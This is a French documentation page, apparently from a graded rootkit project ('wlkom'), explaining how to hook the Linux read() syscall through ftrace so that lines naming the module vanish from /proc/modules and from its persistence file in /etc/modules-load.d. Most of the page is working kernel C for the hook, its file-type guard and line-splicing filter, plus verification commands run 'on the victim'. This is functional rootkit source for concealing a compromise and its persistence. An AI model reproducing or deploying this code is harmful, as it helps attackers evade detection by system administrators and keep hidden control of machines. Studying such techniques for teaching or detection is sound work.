---
title: Cacher les lignes
description: Hooke le syscall read() via ftrace pour filtrer les lignes contenant des chaînes spécifiques avant qu'elles n'atteignent l'espace utilisateur.
---

**Optionnel · 2 pts**

Hooke le syscall `read()` via ftrace pour filtrer les lignes contenant des chaînes spécifiques avant qu'elles n'atteignent l'espace utilisateur.

## Fonctionnement

Même si `lsmod` et `/proc/modules` sont cachés via la liste des modules, un utilisateur déterminé pourrait tout de même faire `cat /proc/modules`. Le **hook `read()`** y répond en interceptant les lectures de fichiers et en analysant le buffer retourné à la recherche de lignes correspondant à un marqueur de `hide_lines[]`. Quand une correspondance est trouvée, le hook *supprime la ligne* du buffer sur place — l'appelant reçoit un buffer plus court comme si la ligne n'avait jamais existé.

Le même hook cache aussi l'entrée de persistence dans `/etc/modules-load.d/wlkom.conf` : un `cat` du fichier ne montrera pas la ligne `wlkom` même si elle est physiquement présente sur le disque.

## Le guard `S_ISREG`

`read()` est appelé pour tout descripteur de fichier lisible : fichiers réguliers, PTY, sockets, pipes, devices caractères. Appliquer la logique de filtrage à tous corromprait les flux réseau et les entrées/sorties terminal.

`hook_read` utilise `fget()` pour inspecter l'inode sous-jacent et court-circuite immédiatement si le fichier n'est pas un fichier régulier (`S_ISREG`) :

```c
struct file *f = fget(regs->di);
if (!f)
    return orig_read(regs);

umode_t mode = file_inode(f)->i_mode;
fput(f);

if (!S_ISREG(mode))
    return orig_read(regs);
```

Cela garantit que les PTY, sockets, pipes et devices sont passés tels quels.

## Logique de filtrage

```c
static asmlinkage ssize_t hook_read(const struct pt_regs *regs)
{
    // guard S_ISREG (ci-dessus)

    ssize_t ret = orig_read(regs);
    if (ret <= 0)
        return ret;

    char __user *buf  = (char __user *)regs->si;
    char        *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    copy_from_user(kbuf, buf, ret);
    kbuf[ret] = '\0';

    // itération sur les marqueurs hide_lines[]
    for (int i = 0; hide_lines[i]; i++) {
        char *pos = kbuf;
        while ((pos = strstr(pos, hide_lines[i])) != NULL) {
            char *end = strchr(pos, '\n');
            if (!end) { *pos = '\0'; ret = pos - kbuf; break; }
            end++;
            size_t tail = (kbuf + ret) - end;
            memmove(pos, end, tail);
            ret -= (end - pos);
            kbuf[ret] = '\0';
        }
    }

    copy_to_user(buf, kbuf, ret);
    kfree(kbuf);
    return ret;
}
```

## Comment il est installé

`hook_read` est installé dans `hide_files_init()` aux côtés de `hook_getdents64`, en utilisant le même mécanisme ftrace : `get_symbol()` localise `__x64_sys_read`, `ftrace_set_filter_ip()` fixe le hook à cette adresse, et `register_ftrace_function()` l'active. Voir [Cacher les fichiers](/fr/rootkit/hide-files) pour le setup ftrace complet.

## Transformation du buffer

```
Buffer retourné par le vrai read() :        Buffer filtré retourné à l'appelant :
┌────────────────────────┐                  ┌────────────────────────┐
│ nvidia 1234567 0       │                  │ nvidia 1234567 0       │
├────────────────────────┤                  ├────────────────────────┤
│ wlkom 98304 0  ← match │  ──splice──►     │ bluetooth 458752 2     │
├────────────────────────┤  memmove         ├────────────────────────┤
│ bluetooth 458752 2     │                  │ vboxguest 90112 2      │
├────────────────────────┤                  └────────────────────────┘
│ vboxguest 90112 2      │                  valeur de retour -= longueur ligne
└────────────────────────┘
```

## Configuration

Ajouter des entrées dans `hide_lines[]` dans `hide.c` avant le `NULL` terminal :

```c
static const char *hide_lines[] = {
    "wlkom",
    NULL,
};
```

## Vérification

```sh
# Sur la victime après insmod :

$ lsmod | grep wlkom
# pas de sortie (hook liste des modules)

$ cat /proc/modules | grep wlkom
# pas de sortie (hook read() supprime la ligne)

$ cat /etc/modules-load.d/wlkom.conf
# pas de sortie (ligne de persistence cachée)

$ dmesg | grep wlkom
# le ring buffer noyau utilise /dev/kmsg — le hook read() ne s'y applique pas
```
